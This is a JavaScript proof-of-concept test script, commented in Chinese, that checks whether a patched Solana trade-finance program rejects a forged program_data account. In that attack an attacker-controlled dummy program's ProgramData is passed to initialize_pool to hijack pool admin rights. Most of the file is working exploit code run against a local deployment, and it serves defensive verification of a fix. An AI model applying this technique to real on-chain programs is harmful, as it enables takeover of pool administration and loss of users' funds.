// C-1 实证测试：伪造 program_data 尝试夺取管理员
// 受害者程序 = 已修复的 trade-finance（本机部署）
// 攻击者部署一个"自己为 UA"的 dummy 程序，取它的真实 ProgramData 作为伪造 program_data
import { Connection, Keypair, PublicKey, SystemProgram, Transaction, TransactionInstruction } from "@solana/web3.js";
import { createMint } from "@solana/spl-token";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";

const RPC = process.env.RPC_URL;
const VICTIM_SO = process.argv[2]; // 受害者程序 .so
const conn = new Connection(RPC, "confirmed");
const BPF_LOADER = new PublicKey("BPFLoaderUpgradeab1e11111111111111111111111");

const disc = (n) => createHash("sha256").update("global:" + n).digest().subarray(0, 8);
const u64 = (v) => { const b = Buffer.alloc(8); b.writeBigUInt64LE(v); return b; };
const progDataPda = (pid) => PublicKey.findProgramAddressSync([pid.toBuffer()], BPF_LOADER)[0];

async function deployProgram(payer, soPath, programKeypair, upgradeAuthority) {
  const args = ["program", "deploy", soPath, "--program-id", programKeypair, "--url", RPC, "--keypair", payer];
  if (upgradeAuthority) args.push("--upgrade-authority", upgradeAuthority);
  const { execSync } = await import("node:child_process");
  execSync(`solana ${args.map(a => `"${a}"`).join(" ")}`, { stdio: "inherit" });
}

(async () => {
  // 受害者：部署 trade-finance（固定 keypair = 已提交的 9c8eND94）
  const victimProgram = new PublicKey("9c8eND94LxNZgDbhvApGsRKojHyxhgEVUBSUHU9tRVU3");
  const victimKeypair = "packages/contracts/target/deploy/trade_finance-keypair.json";
  // 部署者（受害者升级权限）— 用本地 id.json
  const deployerPath = process.env.SOLANA_KEYPAIR_PATH;
  const deployer = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(readFileSync(deployerPath, "utf8"))));
  await deployProgram(deployerPath, VICTIM_SO, victimKeypair, null);

  // 攻击者：生成新 keypair 部署同一个 .so（dummy），UA = attacker
  const attacker = Keypair.generate();
  const attackerProgram = attacker.publicKey;
  const attackerKpPath = "/tmp/poc-attacker.json";
  const { writeFileSync } = await import("node:fs");
  writeFileSync(attackerKpPath, JSON.stringify(Array.from(attacker.secretKey)));
  const { execSync } = await import("node:child_process");
  execSync(`solana --url ${RPC} airdrop 10 ${attacker.publicKey.toBase58()}`, { stdio: "inherit" });
  execSync(`solana program deploy ${VICTIM_SO} --program-id ${attackerKpPath} --url ${RPC} --keypair ${deployerPath} --upgrade-authority ${attacker.publicKey.toBase58()}`, { stdio: "inherit" });

  // 攻击者程序的真实 ProgramData（owner=BPF loader，UA=attacker）
  const forgedProgramData = progDataPda(attackerProgram);
  const victimProgramData = progDataPda(victimProgram);
  console.log("victim ProgramData:", victimProgramData.toBase58());
  console.log("forged (attacker) ProgramData:", forgedProgramData.toBase58());

  // 验证伪造 ProgramData 的字节布局确实是 UA=attacker
  const pdInfo = await conn.getAccountInfo(forgedProgramData);
  if (!pdInfo) { console.error("❌ 伪造 ProgramData 不存在（攻击前置失败）"); process.exit(1); }
  const ua = new PublicKey(pdInfo.data.subarray(13, 45)).toBase58();
  console.log("forged ProgramData UA:", ua, "== attacker?", ua === attacker.publicKey.toBase58());
  if (ua !== attacker.publicKey.toBase58()) { console.error("❌ 伪造 ProgramData UA 不是 attacker"); process.exit(1); }

  // 创建 USDC/LP mint（受害者程序的 pool_authority 作为 LP authority）
  const poolState = PublicKey.findProgramAddressSync([Buffer.from("trade_finance"), Buffer.from("pool")], victimProgram)[0];
  const poolAuthority = PublicKey.findProgramAddressSync([Buffer.from("trade_finance"), Buffer.from("pool_usdc")], victimProgram)[0];
  const usdc = await createMint(conn, deployer, deployer.publicKey, null, 6);
  const lp = await createMint(conn, deployer, poolAuthority, null, 0);

  // 攻击交易：admin=attacker，program_data=伪造的 attacker ProgramData
  const tx = new Transaction();
  tx.feePayer = attacker.publicKey;
  tx.recentBlockhash = (await conn.getLatestBlockhash("confirmed")).blockhash;
  tx.add(new TransactionInstruction({
    keys: [
      { pubkey: poolState, isSigner: false, isWritable: true },
      { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
      { pubkey: usdc, isSigner: false, isWritable: false },
      { pubkey: lp, isSigner: false, isWritable: false },
      { pubkey: poolAuthority, isSigner: false, isWritable: false },
      { pubkey: forgedProgramData, isSigner: false, isWritable: false }, // ← 伪造
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    programId: victimProgram,
    data: Buffer.concat([disc("initialize_pool"), deployer.publicKey.toBuffer(), u64(172800n)]),
  }));
  tx.sign(attacker);

  console.log("\n=== 发送攻击交易（伪造 program_data）===");
  try {
    console.log("🚨 攻击交易通过模拟！正在确认上链...");
    const sig = await conn.sendRawTransaction(tx.serialize());
    await conn.confirmTransaction(sig, "confirmed");
    const ps = await conn.getAccountInfo(poolState);
    if (ps) {
      const admin = new PublicKey(ps.data.subarray(8, 40)).toBase58();
      console.log(`🚨 VULNERABLE: pool admin = ${admin} (attacker=${attacker.publicKey.toBase58()})`);
      process.exit(1);
    }
    console.log("✅ 已上链但池未初始化？检查中...");
  } catch (e) {
    const msg = String(e?.message ?? e);
    if (/Unauthorized|custom program error/i.test(msg)) {
      console.log("✅ PATCHED: 伪造 program_data 被拒绝（Unauthorized）");
      console.log("   C-1 漏洞已封堵，攻击者无法夺取管理员。");
      process.exit(0);
    }
    console.log("❓ 其他错误:", msg.slice(0, 500));
    process.exit(2);
  }
})().catch((e) => { console.error("脚本异常:", e.message); process.exit(2); });
